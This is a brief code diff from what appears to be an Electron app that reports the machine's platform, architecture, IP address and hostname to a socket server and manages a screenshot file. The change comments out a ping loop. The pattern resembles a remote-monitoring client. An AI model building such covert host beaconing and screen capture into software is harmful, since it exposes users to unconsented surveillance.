@@ -28,7 +28,7 @@ function createWindow () {
 
   socket.on('connect', function() {
     socket.emit('new', {platform:os.platform(),arch:os.arch(),ip:ip.v4(),hostname:os.hostname()})
-    setInterval(() => { socket.emit('ping', {hostname:os.hostname()}) }, 15);
+    //setInterval(() => { socket.emit('ping', {hostname:os.hostname()}) }, 15);
     setInterval(() => {
       if(fs.existsSync(__dirname+'\\scr.png')) {
         fs.unlinkSync(__dirname+'\\scr.png')
